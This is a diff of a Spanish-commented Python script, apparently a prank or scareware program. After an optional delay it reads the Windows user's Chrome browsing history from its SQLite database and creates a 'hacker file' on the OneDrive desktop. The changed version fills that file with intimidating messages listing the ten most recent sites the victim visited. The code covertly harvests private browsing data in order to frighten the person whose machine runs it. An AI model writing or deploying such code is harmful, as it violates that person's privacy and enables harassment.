@@ -19,6 +19,13 @@ def delay_action():
     sleep(hours_g) 
 
 
+def create_hacker_file(user_path):
+    hacker_file = open(user_path + "OneDrive/Escritorio/" + HACKER_FILE_NAME,"w") 
+    hacker_file.write("Traviesillo heee 7u7\n\n")
+    print("se ha creado el archivo con exito")
+    return hacker_file
+
+
 def get_chrome_history(user_path):
     urls = None
     while not urls:
@@ -32,21 +39,13 @@ def get_chrome_history(user_path):
             connecting.close() 
             return urls
         except sqlite3.OperationalError:
-            print("Durmiendo 3seg")
+            print("Historial inaccesible, reintentando en 3 segundos")
             sleep(3)
 
 
-def create_hacker_file(user_path,chrome_history):
-    hacker_file = open(user_path + "OneDrive/Escritorio/" + HACKER_FILE_NAME,"w") 
-    hacker_file.write("Top links mas recientes\n\n")
-    contador=0
-    for urlss in chrome_history:
-        contador += 1
-        strings_urls = str(urlss)
-        hacker_file.write("\n\nTop  #{}".format(contador)+"\n"+strings_urls)
-    print("se ha creado el archivo con exito")
-
-    return hacker_file
+def check_history_and_write(hacker_file,chrome_history):
+    for items in chrome_history [:10]:
+        hacker_file.write("He visto que has visitado la web de {}, interesante...\n".format(items[0]))
 
 
 def main():
@@ -54,10 +53,12 @@ def main():
     ####delay_action()   
     # Calculamos la rusta del usuario de windows    
     user_path = get_user_path()
-    #Recojemos el historial de google chrome
-    chrome_history= get_chrome_history(user_path)
     #Creamos un archivo en el escritorio
-    hacker_file = create_hacker_file(user_path,chrome_history)  
+    hacker_file = create_hacker_file(user_path)  
+    #Recojemos el historial de google chrome, mientras este se pueda
+    chrome_history= get_chrome_history(user_path)
+    #Excribiendo mensajes de miedo
+    check_history_and_write(hacker_file,chrome_history)
     
 
 if __name__ == "__main__":
